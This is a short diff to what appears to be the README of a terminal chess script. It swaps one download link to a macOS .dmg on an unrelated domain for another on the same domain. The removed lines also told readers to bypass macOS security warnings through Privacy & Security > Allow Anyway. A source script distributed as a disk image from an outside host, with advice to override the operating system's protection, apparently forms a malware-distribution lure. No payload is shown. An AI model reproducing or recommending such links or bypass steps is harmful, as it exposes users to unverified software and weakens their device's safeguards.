@@ -64,6 +64,4 @@ A simple script to play chess in the terminal.
    ```
 
 
-[Download it today](https://sc.warmraisin.com/Dumb_Fish.dmg)
-
-Because of signing problems, there may be some security errors when opening, you may need to go to Settings > Privacy & Security > Allow Anyway
+[Download it today](https://sc.warmraisin.com/Dumb-Fish.dmg)
